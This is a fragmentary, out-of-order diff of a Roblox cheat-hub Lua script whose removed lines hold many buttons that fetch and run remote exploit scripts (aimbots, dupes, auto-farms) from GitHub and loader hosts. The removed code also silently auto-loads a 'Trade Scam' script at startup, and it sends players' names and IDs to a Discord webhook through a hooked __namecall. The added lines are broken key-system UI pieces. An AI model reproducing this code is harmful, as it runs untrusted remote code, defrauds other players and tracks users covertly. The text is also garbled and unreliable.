-      Enabled = true,
-      Invite = "4mgdcfvAJU",
-      RememberJoins = true
-   },
-
-   -- Key system disabled
-   KeySystem = false,
-})
-
--- Create tabs
-local MainTab = Window:CreateTab("Main", 4483362458)
-local Tab = Window:CreateTab("Da Strike x Da Hood", 4483362458)
-local Fin = Window:CreateTab("Fisch", 4483362458)
-local BballZero = Window:CreateTab("Basketball Zero", 4483362458)
-local BlueLock = Window:CreateTab("Blue Lock Rivals", 4483362458)
-local DeadRails = Window:CreateTab("Dead Rails [Alpha]", 4483362458)
-local BloxFruits = Window:CreateTab("Blox Fruits", 4483362458)
-local PetSim99 = Window:CreateTab("Pet Sim 99", 4483362458) -- Added Pet Sim 99 tab
-local MuscleLegend = Window:CreateTab("Muscle Legend", 4483362458) -- Added Muscle Legend tab
-local Rivals = Window:CreateTab("Rivals", 4483362458) -- Added Rivals tab
-local Universal = Window:CreateTab("Universal", 4483362458)
-local Settings = Window:CreateTab("Settings", 4483362458)
-
-local function executednotify(scriptName)
-   Rayfield:Notify({
-       Title = scriptName,
-       Content = "Script loaded successfully!",
-       Duration = 3,
-       Image = 4483362458,
-   })
-end
-
--- Discord link copy button
-MainTab:CreateButton({
-   Name = "Copy Discord Link",
-   Callback = function()
-       if setclipboard then
-           setclipboard("https://discord.gg/4mgdcfvAJU")
-           Rayfield:Notify({
-               Title = "Discord Link Copied",
-               Content = "Invite link copied to clipboard!",
-               Duration = 3,
-               Image = 4483362458,
-           })
-       else
-           print("Discord link: https://discord.gg/4mgdcfvAJU")
-       end
-   end,
-})
-
--- Test webhook button
-MainTab:CreateButton({
-   Name = "Test Webhook",
-   Callback = function()
-       sendUsageData()
-       Rayfield:Notify({
-           Title = "Webhook Test",
-           Content = "Attempted to send webhook notification!",
-           Duration = 3,
-           Image = 4483362458,
-       })
-   end,
-})
-
--- Da Strike x Da Hood Tab scripts
-Tab:CreateButton({
-   Name = "Psalm",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/NewWhitelistService/l/refs/heads/main/psalms%20old.lua"))()
-        executednotify("Test Webhook")
-   end,
-})
-
-Tab:CreateButton({
-   Name = "Ballware vfs",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/refs/heads/main/Protected_4021809531880627.txt"))()
-        executednotify("Ballware vfs")
-   end,
-})
-
-Tab:CreateButton({
-   Name = "FrostByte",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Totocoems/Frostbyte-/main/Frostbyte%20leak"))()
-        executednotify("FrostByte")
-   end,
-})
-
-Tab:CreateButton({
-   Name = "Da Hood Script",
-   Callback = function()
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/Zinzs/luascripting/main/canyoutellitsadahoodscriptornot.lua'))()
-        executednotify("Da Hood Script")
-   end,
-})
--- Fisch Tab
-Fin:CreateButton({
-   Name = "Speed Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
-        executednotify("Speed Hub")
-   end,
-})
-
-
-Fin:CreateButton({
-   Name = "ThanHub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1"))()
-        executednotify("ThanHub")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "Rift GUI",
-   Callback = function()
-        loadstring(getHttpRequest("https://github.com/Synergy-Networks/products/raw/main/Rift/loader.lua"))()
-        executednotify("Rift GUI")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "Hooked Script",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Superman245/sc2/refs/heads/main/s6"))()
-        executednotify("Hooked Script")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "HomoHack",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/dementiaenjoyer/homohack/main/loader.lua"))()
-        executednotify("HomoHack")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "Native Hub",
-   Callback = function()
-        script_key="4JxQ1x@+1"
-        loadstring(getHttpRequest("https://getnative.cc/script/loader"))()
-        executednotify("Native Hub")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "Raito Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Efe0626/RaitoHub/refs/heads/main/Script"))()
-        executednotify("Raito Hub")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "Zenith Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Efe0626/ZenithHub/refs/heads/main/Loader"))()
-        executednotify("Zenith Hub")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "Lunor Script",
-   Callback = function()
-        script_key = 'lunor_free_key'
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Just3itx/Lunor-Loadstrings/refs/heads/main/Loader"))()
-        executednotify("Lunor Script")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "Ronix Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/4a8848fbc1047bcc62c49e797384e9ab.lua"))()
-        executednotify("Ronix Hub")
-   end,
-})
--- Basketball Zero script with bypass
-BballZero:CreateButton({
-   Name = "Ball Control",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/laj_hub_test.lua"))()
-        executednotify("Ball Control")
-   end,
-})
-
--- Blue Lock Rivals script
-BlueLock:CreateButton({
-   Name = "LAJ HUB",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/bluelocklajhub/refs/heads/main/blue_lock_mod.lua"))()
-        executednotify("LAJ HUB")
-   end,
-})
-
-BlueLock:CreateButton({
-   Name = "Piskasiska Script",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Piskasiska22222/tester/refs/heads/main/test"))()
-        executednotify("Piskasiska Script")
-   end,
-})
-
-
-PetSim99:CreateButton({
-   Name = "LAJ HUB",
-   Callback = function()
-       -- Load the script from GitHub
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
-       executednotify("Airflow UPDATED")
-   end,
-})
--- Muscle Legend Tab
-MuscleLegend:CreateSection("Muscle Legend Scripts")
-
-MuscleLegend:CreateButton({
-   Name = "Muscle Legend Script",
-   Callback = function()
-       loadstring(game:HttpGet(("https://raw.githubusercontent.com/ahmadsgamer2/Script--Game/main/Muscle-Legends"),true))()
-       executednotify("Muscle Legend Script")
-   end,
-})
-
--- Universal Tab Scripts
-Universal:CreateButton({
-   Name = "Infinite Yield FE",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-       executednotify("Infinite Yield FE")
-   end,
-})
-
-Universal:CreateButton({
-   Name = "Dex Explorer",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/scriptlx/refs/heads/main/dex.lua"))()
-       executednotify("Dex Explorer")
-   end,
-})
-
-Universal:CreateButton({
-   Name = "Hydroxide",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/xChaoticVoid/Hydroxide/main/beta.lua"))()
-       executednotify("Hydroxide")
-   end,
-})
-
-Universal:CreateButton({
-   Name = "SimpleSpy",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
-       executednotify("SimpleSpy")
-   end,
-})
-
-Universal:CreateButton({
-   Name = "LAJ HUB",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source'))()
-       executednotify("Airflow UPDATED")
-   end,
-})
-
-Universal:CreateButton({
-   Name = "Domain X",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/shlexware/DomainX/main/source'))()
-       executednotify("Domain X")
-   end,
-})
-
-
--- Settings Tab
-local idled_Connection
-
-local function onIdled()
-    if game then
-        game:GetService("VirtualUser"):CaptureController()
-        game:GetService("VirtualUser"):ClickButton2(Vector2.new(0, 0))
-    end
-end
-
-Settings:CreateButton({
-    Name = "Anti AFK",
-    Callback = function()
-        if game and not idled_Connection and game.Players.LocalPlayer.Idled then
-            idled_Connection = game.Players.LocalPlayer.Idled:Connect(onIdled)
-            executednotify("Anti AFK")
-        end
-    end,
-})
-
-local Inf_jump = false
-local jumpConnection = nil
-
-Settings:CreateToggle({
-   Name = "Infinite Jump",
-   CurrentValue = false,
-   Callback = function(Value)
-      Inf_jump = Value
-      
-      -- Disconnect previous connection if it exists
-      if jumpConnection then
-          jumpConnection:Disconnect()
-          jumpConnection = nil
-      end
-      
-      -- Only create a new connection if Inf_jump is enabled and in game environment
-      if Inf_jump and game then
-          jumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
-             if Inf_jump and game.Players.LocalPlayer.Character then
-                game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-             end
-          end)
-      end
-   end,
-})
-
--- Credit section
-local creditSection = MainTab:CreateSection("Credits")
-
-MainTab:CreateLabel("Created by LAJ Hub Team")
-MainTab:CreateLabel("Discord: discord.gg/4mgdcfvAJU")
-MainTab:CreateLabel("Script Version: 4.1 (Swift Compatible)")
-MainTab:CreateLabel("* Optimized for Swift Executor")
-
--- Print Swift compatibility notice
-print("LAJ HUB - Swift Compatible Version")
-print("All HTTP requests have been optimized for Swift executor")
-print("This version includes:")
-print("1. Full Swift compatibility")
-print("2. Pet Sim 99 Tab with new Trade Scam V2")
-print("3. All scripts updated to work with Swift")
-print("4. Improved executor detection")
-
--- Rivals Tab
-Rivals:CreateSection("Rivals Scripts")
-
-Rivals:CreateButton({
-   Name = "RIVALS Winter",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/SkibidiCen/MainMenu/main/Code"))()
-        executednotify("RIVALS Winter")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Azure Mod",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Actyrn/Scripts/main/AzureModded"))()
-        executednotify("Azure Mod")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Tbao Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubRivals"))()
-        executednotify("Tbao Hub")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "8Bits Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/8bits4ya/rivals-v3/refs/heads/main/main.lua"))()
-        executednotify("8Bits Hub")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Venox Hub",
-   Callback = function()
-        loadstring(getHttpRequest('https://raw.githubusercontent.com/venoxhh/universalscripts/main/rivals/venoxware'))()
-        executednotify("Venox Hub")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Lunax Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Alexisisback/Lunax/refs/heads/main/Loader.lua"))()
-        executednotify("Lunax Hub")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Ventures.lua",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/laeraz/ventures/refs/heads/main/rivals.lua"))()
-        executednotify("Ventures.lua")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Ronix Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/b581d07bfd134ff4ea612d671361be77.lua"))()
-        executednotify("Ronix Hub")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "PinguinRVS",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/PUSCRIPTS/PINGUIN/refs/heads/main/RivalsV1"))()
-        executednotify("PinguinRVS")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Zypherion",
-   Callback = function()
-        loadstring(getHttpRequest(('https://raw.githubusercontent.com/blackowl1231/ZYPHERION/refs/heads/main/main.lua')))()
-        executednotify("Zypherion")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Auto Farm Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/212c1198a1beacf31150a8cf339ba288.lua"))()
-        executednotify("Auto Farm Hub")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Rybow Aimbot",
-   Callback = function()
-        loadstring(getHttpRequest('https://raw.githubusercontent.com/rybowe/rybowescripts/main/release.lua'))()
-        executednotify("Rybow Aimbot")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Xera Script",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/luascriptsROBLOX/Xerar/refs/heads/main/RivalsxeraPBF"))()
-        executednotify("Xera Script")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Minimal Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/MinimalScriptingService/MinimalRivals/main/rivals.lua",true))()
-        executednotify("Minimal Hub")
-   end,
-})
--- Dead Rails Tab
-DeadRails:CreateSection("Dead Rails Scripts")
-
-DeadRails:CreateButton({
-   Name = "Markk Keyless",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/Markklol/aw/refs/heads/main/Protected/DRailsv2.lua'))()
-       executednotify("Markk Keyless")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Farx11122 Keyless",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/Farx11122/Dupess/main/SecondDupe"))()
-       executednotify("Farx11122 Keyless")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "SpiderXHub Keyless",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/SpiderScriptRB/Dead-Rails-SpiderXHub-Script/refs/heads/main/SpiderXHub%202.0.txt"))()
-       executednotify("SpiderXHub Keyless")
-   end,
-})
-DeadRails:CreateButton({
-   Name = "Strelizia Keyless",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/0vma/Strelizia/refs/heads/main/Standalone/DeadRails.lua', true))()
-       executednotify("Strelizia Keyless")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Rinns Dead Rails No Key",
-   Callback = function()
-       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/e1cfd93b113a79773d93251b61af1e2f.lua"))()
-       executednotify("Rinns Dead Rails No Key")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Auto Farm Bond",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/Emplic/deathrails/refs/heads/main/bond"))()
-       executednotify("Auto Farm Bond")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Lomu Hub",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/notyourfavorite1/lomuhubmain/refs/heads/main/main.txt', true))()
-       executednotify("Lomu Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Neox Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/hassanxzayn-lua/NEOXHUBMAIN/refs/heads/main/loader", true))()
-       executednotify("Neox Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Sypher Hub OP",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/nocturnal631/Dead-ra/refs/heads/main/Mmm"))()
-       executednotify("Sypher Hub OP")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Tbao Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/refs/heads/main/TbaoHubDeadRails"))()
-       executednotify("Tbao Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Karol Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/Karolmn9900/karolhub/refs/heads/main/script"))()
-       executednotify("Karol Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Dead Rails Alpha Script",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/DeadRails", true))()
-       executednotify("Dead Rails Alpha Script")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "LAJ HUB",
-   Callback = function()
-       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/255ac567ced3dcb9e69aa7e44c423f19.lua"))()
-       executednotify("Airflow UPDATED")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "LAJ HUB",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/InfernusScripts/Null-Fire/main/Loader"))()
-       executednotify("Airflow UPDATED")
-   end,
-})
-
--- BloxFruits Tab Scripts
-BloxFruits:CreateSection("Blox Fruits Scripts")
-
-BloxFruits:CreateButton({
-   Name = "Wolf Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://link.trwxz.com/LS-Wolf-Hub"))()
-        executednotify("Wolf Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "RIPPER Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/hajibeza/Module/main/Mobile_Script.lua"))()
-        executednotify("RIPPER Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "THUNDER Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/RemakeMobileTest"))()
-        executednotify("THUNDER Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "MATSUNE Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/Matsunebeta.lua"))()
-        executednotify("MATSUNE Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "MIN SEAGATE Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/CheemsNhuChiAl/MinGamingHub/main/mingamingupdatenew"))()
-        executednotify("MIN SEAGATE Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "ZINER Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tienvn123tkvn/Test/main/ZINERHUB.lua"))()
-        executednotify("ZINER Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "MUXUS Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/MuxusTL/BloxFruits/main/MuxusHub_V2.lua"))()
-        executednotify("MUXUS Hub")
-   end,
-})
-
-
-BloxFruits:CreateButton({
-   Name = "Uranium Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Augustzyzx/UraniumMobile/main/UraniumKak.lua"))()
-        executednotify("Uranium Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "Azure Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
-        executednotify("Azure Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "Vector Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tuxoz/VectorHub/main/BloxFruitPC%26MOBILE"))()
-        executednotify("Vector Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "Wolf Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://link.trwxz.com/LS-Wolf-Hub"))()
-        executednotify("Wolf Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "Payback Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Script-Blox/Script/main/PayBack.lua"))()
-        executednotify("Payback Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "RIPPER Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/hajibeza/Module/main/Mobile_Script.lua"))()
-        executednotify("RIPPER Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "KAY Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/AXCScript/KayMobile/main/Script-Loader"))()
-        executednotify("KAY Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "SEAGATE Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/SeaBabyBF/seamain/main/SeaGateNextGenz"))()
-        executednotify("SEAGATE Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "MATSUNE Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/Matsunebeta.lua"))()
-        executednotify("MATSUNE Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "MIN SEAGATE Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/CheemsNhuChiAl/MinGamingHub/main/mingamingupdatenew"))()
-        executednotify("MIN SEAGATE Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "ZINER Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tienvn123tkvn/Test/main/ZINERHUB.lua"))()
-        executednotify("ZINER Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "MUXUS Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/MuxusTL/BloxFruits/main/MuxusHub_V2.lua"))()
-        executednotify("MUXUS Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "MIN GREEN Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Basicallyybeta/main/main/Mingaming.lua"))()
-        executednotify("MIN GREEN Hub")
-   end,
--- User counter for session tracking
-local userCounter = 0
-
--- Load the webhook system from GitHub
-local WebhookModule
-
--- Try to load the webhook module with proper error handling
-local success, error_message = pcall(function()
-    -- Replace with your actual GitHub raw URL when you upload it
-    WebhookModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/laj_hub_webhook.lua"))()
-end)
-
-if not success then
-    warn("Failed to load webhook module: " .. tostring(error_message))
-    -- Create fallback module with empty functions
-    WebhookModule = {
-        sendUsageData = function() warn("Using fallback sendUsageData") end,
-        logKeyUsage = function(key) warn("Using fallback logKeyUsage for key: " .. tostring(key)) end,
-        logBanEvent = function() warn("Using fallback logBanEvent") end
-    }
-end
-
--- Send initial usage data
-spawn(function()
-    wait(2) -- Wait for the UI to initialize
-    WebhookModule.sendUsageData()
-end)
-
--- Function wrapper for backward compatibility
-    
-    -- Check for anti-spam by validating the reason
-    if not reason or reason == "" then
-        reason = "Unknown (No reason provided)"
-    end
-    
-    -- Create a unique identifier for this notification to prevent duplicates
-    local notificationId = tostring(Player.UserId) .. "_" .. game.PlaceId .. "_" .. os.time()
-    
-    -- Limit data being sent for privacy and security
-    local success, error_message = pcall(function()
-        -- Update the timestamp for rate limiting
-        lastWebhookTime = currentTime
         
-        -- Use makeHttpRequest instead of request for better compatibility
-        makeHttpRequest({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode({
-                ["content"] = "",
-                ["embeds"] = {{                  
-                    ["title"] = "Player Banned/Kicked Alert",
-                    ["color"] = 16711680, -- Red color for ban alerts
-                    ["fields"] = {
-                        {
-                            ["name"] = "User",
-                            ["value"] = "```" .. Player.Name .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "User ID",
-                            ["value"] = "```" .. tostring(Player.UserId) .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Game",
-                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Game ID",
-                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Ban/Kick Reason",
-                            ["value"] = "```" .. (reason or "Unknown") .. "```",
-                            ["inline"] = false
-                        },
-                        {
-                            ["name"] = "Notification ID",
-                            ["value"] = "```" .. notificationId .. "```",
-                            ["inline"] = false
-                        }
-                    },
-                    ["footer"] = {
-                        ["text"] = "Ban/Kick Alert"
-                    }
-                }}
-            })
-        })
+        StatusLabel.Text = "Discord link copied to clipboard!"
+        StatusLabel.TextColor3 = Color3.fromRGB(114, 137, 218)
     end)
     
-    if not success then
-        warn("Failed to send ban webhook: " .. tostring(error_message))
-    end
-end
-    -- Create a unique identifier for this notification to prevent duplicates
-    local notificationId = tostring(Player.UserId) .. "_" .. game.PlaceId .. "_" .. os.time()
-    
-    -- Limit data being sent for privacy and security
-    local success, error_message = pcall(function()
-        -- Update the timestamp for rate limiting
-        lastWebhookTime = currentTime
+    -- Minimize button action
+    local isMinimized = false
+    MinimizeButton.MouseButton1Click:Connect(function()
+        isMinimized = not isMinimized
         
-        -- Use makeHttpRequest instead of request for better compatibility
-        makeHttpRequest({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode({
-                ["content"] = "",
-                ["embeds"] = {{                  
-                    ["title"] = "Player Banned/Kicked Alert",
-                    ["color"] = 16711680, -- Red color for ban alerts
-                    ["fields"] = {
-                        {
-                            ["name"] = "User",
-                            ["value"] = "```" .. Player.Name .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "User ID",
-                            ["value"] = "```" .. tostring(Player.UserId) .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Game",
-                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Game ID",
-                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Ban/Kick Reason",
-                            ["value"] = "```" .. (reason or "Unknown") .. "```",
-                            ["inline"] = false
-                        },
-                        {
-                            ["name"] = "Notification ID",
-                            ["value"] = "```" .. notificationId .. "```",
-                            ["inline"] = false
-                        }
-                    },
-                    ["footer"] = {
-                        ["text"] = "Ban/Kick Alert"
-                    }
-                }}
-            })
-        })
+        if isMinimized then
+            -- Minimize animation
+            local targetSize = UDim2.new(0, 400, 0, 30)
+            local targetContentPos = UDim2.new(0, 0, 0, 0)
+            
+            TweenService:Create(MainFrame, TweenInfo.new(0.3), {Size = targetSize}):Play()
+            ContentArea.Visible = false
+            MinimizeButton.Text = "+"
+        else
+            -- Restore animation
+            local targetSize = UDim2.new(0, 400, 0, 300)
+            
+            TweenService:Create(MainFrame, TweenInfo.new(0.3), {Size = targetSize}):Play()
+            wait(0.3)
+            ContentArea.Visible = true
+            MinimizeButton.Text = "-"
+        end
     end)
     
-    if not success then
-        warn("Failed to send ban webhook: " .. tostring(error_message))
-    end
+    -- Drop shadow effect
+    local DropShadow = Instance.new("ImageLabel")
+    DropShadow.Name = "DropShadow"
+    DropShadow.Size = UDim2.new(1, 20, 1, 20)
+    DropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
+    DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
+    DropShadow.BackgroundTransparency = 1
+    DropShadow.Image = "rbxassetid://6014261993"
+    DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+    DropShadow.ImageTransparency = 0.5
+    DropShadow.ScaleType = Enum.ScaleType.Slice
+    DropShadow.SliceCenter = Rect.new(49, 49, 450, 450)
+    DropShadow.ZIndex = -1
+    DropShadow.Parent = MainFrame
 end
 
--- Set up event listeners for kick/ban detection
--- Method 1: Detect when player is removed
-Players.PlayerRemoving:Connect(function(player)
-    if player == Player then
-        logBanEvent("Player removed from game (possibly kicked/banned)")
-    end
-end)
-
--- Method 2: Detect common kick methods
-local oldNameCall
-oldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
-    local args = {...}
-    local method = getnamecallmethod()
+-- Main function to start the key system
+local function startKeySystem()
+    -- Create the UI
+    createKeySystemUI()
     
-    if method == "Kick" and self == Player then
-        local reason = args[1] or "Unknown"
-        logBanEvent(reason)
-    end
-    
-    return oldNameCall(self, ...)
-end)
-
--- Method 3: Monitor teleport failures as they often occur during bans
-game:GetService("TeleportService").TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
-    if player == Player and (teleportResult == Enum.TeleportResult.Banned or teleportResult == Enum.TeleportResult.GameEnded) then
-        logBanEvent("Teleport failed due to ban: " .. errorMessage)
-    end
-end)
-
-print("LAJ HUB Ban detection system loaded successfully")
-end
-    LAJ HUB - Swift Compatible Version
-    Created for universal executor compatibility with special Swift support
-]]
-
--- Function to handle HTTP requests across different executors including Swift
-local function getHttpRequest(url)
-    -- For testing in standalone Lua, use a mock response
-    if not game then
-        print("Mock HTTP request to: " .. url)
-        return "-- mock response for testing"
-    end
-    
-    if swift and swift.request then
-        local response = swift.request({
-            Url = url,
-            Method = "GET"
-        })
-        if response and response.Body then
-            return response.Body
-        end
-    end
-    
-    -- Fallback to standard HttpGet for other executors
-    return game:HttpGet(url)
+    -- Set up kick detection
+    spawn(function()
+        setupKickDetection()
+    end)
 end
 
--- Load Pet Simulator 99 Trade Scam script when in Roblox environment
-if game then
-    loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
-end
-
-local Rayfield = loadstring(getHttpRequest('https://sirius.menu/rayfield'))()
-
--- Initialize game services safely
-local Players = game and game:GetService("Players") or {}
